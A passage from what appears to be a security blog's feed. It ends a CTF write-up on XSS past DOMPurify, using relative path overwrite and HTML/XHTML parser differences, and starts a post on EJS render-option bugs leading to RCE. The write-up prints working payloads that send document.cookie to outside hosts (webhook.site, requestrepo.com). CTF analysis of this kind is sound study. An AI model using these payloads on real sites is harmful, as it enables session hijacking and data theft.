function">getElementById</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>When loading <code>main.js</code> in <code>index.xhtml</code>, it uses a relative path: <code>&lt;script src=&quot;main.js&quot;&gt;&lt;/script&gt;</code>.</p><p>Let’s first look at the unintended solution, which is quite interesting.</p><p>The unintended solution is to make the bot load this path: <code>/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//asd%2f..%2f..%2findex.xhtml#https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?</code></p><p>This exploits RPO (Relative Path Overwrite) to cause mischief. For the backend, <code>%2f</code> is interpreted as <code>/</code>, so this URL loads <code>index.xhtml</code> without any issues.</p><p>However, for the browser, the current path becomes <code>1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//</code>, so it will load <code>/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//main.js</code>. According to Express’s route, the response will be:</p><pre class="line-numbers language-none"><code class="language-none">Page &#x2F;1;var[Page]&#x3D;[1];location&#x3D;location.hash.slice(1)+document.cookie&#x2F;&#x2F;main.js not found<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>The first line <code>Page /1</code> does not throw a “variable is not defined” error because of the hoisting of <code>var [Page]=[1]</code>, and the last line <code>main.js not found</code> is turned into a comment by the preceding <code>//</code>, so the middle part is executed, and the cookie is stolen.</p><p>This operation is really cool.</p><h3><span id="sanitized-revenge-3-solves">Sanitized Revenge (3 solves)</span></h3><p>This question fixes the unintended behavior, so let’s take a look at the expected solution.</p><p>First and foremost, the important point of this question is that the webpage is xhtml, not html, so the browser’s parsing behavior will be different.</p><p>For example, the payload provided by the author:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span>&lt;![CDATA[<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">data-x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>]]＞&lt;/style>&lt;iframe name='Page' />&lt;base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' />&lt;style>&lt;!--<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">--></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>will be parsed by the HTML parser as a style tag + a div with the <code>data-x</code> attribute, so DOMPurify won’t do anything, and this is valid HTML.</p><p>But because we are in xhtml, the CDATA part becomes something that looks like a comment, so after removing it, it becomes:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>Page<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>/**/+location.assign(document.all.url.textContent+document.cookie)//<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--">&lt;/div>&lt;style>--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>The iframe and base that were originally inside the attribute come out.</p><p>We need the base because when we encounter CSP like <code>script-src &#39;self&#39;</code>, the first instinct is to use <code>&lt;iframe srcdoc&gt;</code> with a script gadget to bypass it. However, in this question, due to the limitation of xhtml, <code>&lt;</code> cannot be present in attributes, so we need to use the upcoming <code>report.js</code> together with base to change the path.</p><p>In the <a href="https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Sanitized%20Revenge">author’s writeup</a>, there are several other solutions given, each of which is quite interesting.</p><p>The first one takes advantage of the fact that HTML ignores <code>&lt;!--</code> inside style tags, but xhtml doesn’t, to create a difference:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"><span class="token selector">a</span> <span class="token punctuation">&#123;</span> <span class="token property">color</span><span class="token punctuation">:</span> &lt;!--<span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-->&lt;/style>&lt;base href='/(document.location=/http:/.source.concat(String.fromCharCode(47)).concat(String.fromCharCode(47)).concat(/cb6c5dql.requestrepo.com/.source).concat(String.fromCharCode(47)).concat(document.cookie));var[Page]=[1]//x/' /><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>The second one exploits the fact that DOMPurify checks for valid HTML tags when detecting mXSS, which need to be ASCII alphanumeric, but XML actually allows more characters:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">&lt;<span class="token property">ø</span><span class="token punctuation">:</span>base id=<span class="token string">"giotino"</span> <span class="token property">xmlns</span><span class="token punctuation">:</span>ø=<span class="token string">"http://www.w3.org/1999/xhtml"</span> href=<span class="token string">"/**/=1;alert(document.cookie);//"</span> /></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>So it’s fine in an HTML context, but in xhtml, it will still be parsed as a base tag.</p><p>The third one looks similar to the first one, but the first one is much simpler. It goes like this:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">ff<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--&lt;/style>&lt;a id="--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>base</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--">&lt;/a>&lt;style>&amp;lt;k&lt;/style>&lt;style>--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>In HTML, it’s just a style tag + an a tag + two style tags. But in xhtml, the <code>&lt;!-- --&gt;</code> inside the style is also considered a comment, so it becomes:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">ff<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">&lt;base href=<span class="token string">'/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//'</span>>&lt;/base></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>From the desired effect he wants to achieve, it seems that it can be simplified like this:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">ff<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--&lt;/style>&lt;a id="--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>base</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--">&lt;/a>&lt;style>--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;A while ago, I was busy traveling and didn’t have much time for CTFs. Even if I did participate, I was too lazy to write a writeup, so my last writeup was back in March. I felt it was a shame to break the streak, so I quickly wrote another one to make up for it.&lt;/p&gt;
&lt;p&gt;Regarding the three CTFs mentioned in the title, I only participated in GoogleCTF 2023. For the other two events, I only briefly looked at the challenges, so this post will only serve as a note on the challenges and their solutions.&lt;/p&gt;
&lt;p&gt;Keyword list:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Inconsistent order of POST data parsing between Flask and PHP&lt;/li&gt;
&lt;li&gt;iframe CSP blocking certain script loads&lt;/li&gt;
&lt;li&gt;CSRF bypass using HEAD method&lt;/li&gt;
&lt;li&gt;Accessing parent origin using &lt;code&gt;location.ancestorOrigins&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Changing iframe location doesn’t affect the src&lt;/li&gt;
&lt;li&gt;Angular CSP bypass gadget in recaptcha URL&lt;/li&gt;
&lt;li&gt;Restoring input using &lt;code&gt;document.execCommand(&amp;#39;undo&amp;#39;);&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;X-HTTP-Method-Override&lt;/li&gt;
&lt;li&gt;Differences between HTML and XHTML parsers&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>EJS Vulnerabilities in CTF</title>
    <link href="https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/"/>
    <id>https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/</id>
    <published>2023-06-22T06:10:44.000Z</published>
    <updated>2023-06-22T14:23:59.577Z</updated>
    
    <content type="html"><![CDATA[<p>Originally, I intended to write this article from a developer’s perspective. However, due to time constraints, I will first write a CTF-oriented article to record this issue. I will write from a developer’s perspective when I have more time.</p><p>In short, this article discusses the problems caused by using the following pattern:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">3000</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Example app listening on port </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>port<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><span id="more"></span><h2><span id="previous-ctf-challenges">Previous CTF challenges</span></h2><p>There are two types of EJS-related challenges that have been created in CTFs. The first type is where you can control the second parameter of the render function, as shown above. The second type is where you cannot control the second parameter, but there is a prototype pollution vulnerability.</p><p>For the first type, I personally think that EJS’s handling of parameters is problematic. You may think that only data is passed in, but in fact, options and data are passed together. Therefore, you can modify options to control some execution processes and achieve RCE.</p><p>For the second type, the main idea is to pollute <code>outputFunctionName</code> through prototype pollution, and then rely on EJS’s underlying code to concatenate JS code to achieve RCE.</p><p>However, EJS has added checks for <code>outputFunctionName</code> to ensure that the input is a valid variable name.</p><p>This article mainly discusses the first type of situation.</p><p>Below are some related challenges that have appeared in the past. In the early days, prototype pollution was the main focus, but recently, more challenges are more about passing an object.</p><ul><li><a href="https://nanimokangaeteinai.hateblo.jp/entry/2023/06/19/120016#Web-127-CODEGATE-Music-Player-30-solves">Codegate CTF 2023 Preliminary - Music Player</a></li><li><a href="https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/express-javascript-security">SEETF 2023 - Express JavaScript Security</a></li><li><a href="https://blog.maple3142.net/2023/06/05/justctf-2023-writeups/#perfect-product">justCTF 2023 - Perfect Product</a></li><li><a href="https://hxp.io/blog/101/hxp-CTF-2022-valentine/">hxp CTF 2022 - valentine</a></li><li><a href="https://github.com/aszx87410/ctf-writeups/issues/35">Pwn2Win CTF 2021 - Illusion</a></li><li><a href="https://github.com/CykuTW/My-CTF-Challenges/blob/master/AIS3-EOF-CTF-2019-Quals/echo/README.zh-TW.md">AIS3 EOF CTF 2019 Quals - echo</a></li><li><a href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs">XNUCA 2019 Qualifier - hardjs</a></li></ul><h2><span id="root-cause">Root Cause</span></h2><p>After calling <code>res.render()</code>, it will first go to <a href="https://github.com/expressjs/express/blob/4.18.2/lib/response.js#L1016">express&#x2F;lib&#x2F;response.js</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">res<span class="token punctuation">.</span><span class="token function-variable function">render</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token parameter">view<span class="token punctuation">,</span> options<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>req<span class="token punctuation">.</span>app<span class="token punctuation">;</span>  <span class="token keyword">var</span> done <span class="token operator">=</span> callback<span class="token punctuation">;</span>  <span class="token keyword">var</span> opts <span class="token operator">=</span> options <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> req <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>req<span class="token punctuation">;</span>  <span class="token keyword">var</span> self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>  <span class="token comment">// support callback function as second arg</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> options <span class="token operator">===</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    done <span class="token operator">=</span> options<span class="token punctuation">;</span>    opts <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// merge res.locals</span>  opts<span class="token punctuation">.</span>_locals <span class="token operator">=</span> self<span class="token punctuation">.</span>locals<span class="token punctuation">;</span>  <span class="token comment">// default callback to respond</span>  done <span class="token operator">=</span> done <span class="token operator">||</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token keyword">return</span> req<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    self<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token comment">// render</span>  app<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> opts<span class="token punctuation">,</span> done<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Then, let’s check <code>app.render</code> in <a href="https://github.com/expressjs/express/blob/4.18.2/lib/application.js#L548">express&#x2F;lib&#x2F;application.js</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function-variable function">render</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">render</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> options<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> cache <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cache<span class="token punctuation">;</span>  <span class="token keyword">var</span> done <span class="token operator">=</span> callback<span class="token punctuation">;</span>  <span class="token keyword">var</span> engines <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>engines<span class="token punctuation">;</span>  <span class="token keyword">var</span> opts <span class="token operator">=</span> options<span class="token punctuation">;</span>  <span class="token keyword">var</span> renderOptions <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> view<span class="token punctuation">;</span>  <span class="token comment">// support callback function as second arg</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> options <span class="token operator">===</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    done <span class="token operator">=</span> options<span class="token punctuation">;</span>    opts <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// merge app.locals</span>  <span class="token function">merge</span><span class="token punctuation">(</span>renderOptions<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>locals<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// merge options._locals</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>_locals<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">merge</span><span class="token punctuation">(</span>renderOptions<span class="token punctuation">,</span> opts<span class="token punctuation">.</span>_locals<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// merge options</span>  <span class="token function">merge</span><span class="token punctuation">(</span>renderOptions<span class="token punctuation">,</span> opts<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// set .cache unless explicitly provided</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>renderOptions<span class="token punctuation">.</span>cache <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    renderOptions<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">enabled</span><span class="token punctuation">(</span><span class="token string">'view cache'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// primed cache</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>renderOptions<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    view <span class="token operator">=</span> cache<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// view</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>view<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> View <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'view'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">View</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">defaultEngine</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token literal-property property">root</span><span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token literal-property property">engines</span><span class="token operator">:</span> engines    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>view<span class="token punctuation">.</span>path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> dirs <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>view<span class="token punctuation">.</span>root<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> view<span class="token punctuation">.</span>root<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span>        <span class="token operator">?</span> <span class="token string">'directories "'</span> <span class="token operator">+</span> view<span class="token punctuation">.</span>root<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'", "'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'" or "'</span> <span class="token operator">+</span> view<span class="token punctuation">.</span>root<span class="token punctuation">[</span>view<span class="token punctuation">.</span>root<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'"'</span>        <span class="token operator">:</span> <span class="token string">'directory "'</span> <span class="token operator">+</span> view<span class="token punctuation">.</span>root <span class="token operator">+</span> <span class="token string">'"'</span>      <span class="token keyword">var</span> err <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Failed to lookup view "'</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">'" in views '</span> <span class="token operator">+</span> dirs<span class="token punctuation">)</span><span class="token punctuation">;</span>      err<span class="token punctuation">.</span>view <span class="token operator">=</span> view<span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// prime the cache</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>renderOptions<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      cache<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> view<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// render</span>  <span class="token function">tryRender</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> renderOptions<span class="token punctuation">,</span> done<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Finally, <code>tryRender</code> is called, and the code is in <a href="https://github.com/expressjs/express/blob/4.18.2/lib/application.js#L655">express&#x2F;lib&#x2F;application.js</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">tryRender</span><span class="token punctuation">(</span><span class="token parameter">view<span class="token punctuation">,</span> options<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    view<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>options<span class="token punctuation">,</span> callback<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">callback</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This <code>view.render</code> will call the <code>__express</code> method inside the view engine, and this method in EJS is <code>renderFile</code>:</p><p><a href="https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L926">ejs&#x2F;lib&#x2F;ejs.js</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * Express.js support. * * This is an alias for &#123;@link module:ejs.renderFile&#125;, in order to support * Express.js out-of-the-box. * * @func */</span>exports<span class="token punctuation">.</span>__express <span class="token operator">=</span> exports<span class="token punctuation">.</span>renderFile<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#441">renderFile</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">exports<span class="token punctuation">.</span><span class="token function-variable function">renderFile</span> <span class="token operator">=</span> <span class="token 